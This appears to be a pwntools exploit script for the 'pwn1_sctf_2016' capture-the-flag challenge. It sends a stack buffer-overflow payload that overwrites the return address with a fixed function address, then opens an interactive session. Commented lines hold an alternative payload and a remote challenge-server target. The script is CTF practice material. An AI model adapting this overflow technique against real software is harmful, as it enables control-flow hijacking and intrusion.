from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("node4.buuoj.cn",29602)
p=process("./pwn1_sctf_2016")

addr=0x8048F0D

payload=0x14*b'I'+4*b'b'+p32(addr)

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# # payload=b'233'
# p.sendafter(b'Tell me something about yourself: ',payload)

# p.sendline(b'ls')
p.sendline(payload)
p.interactive()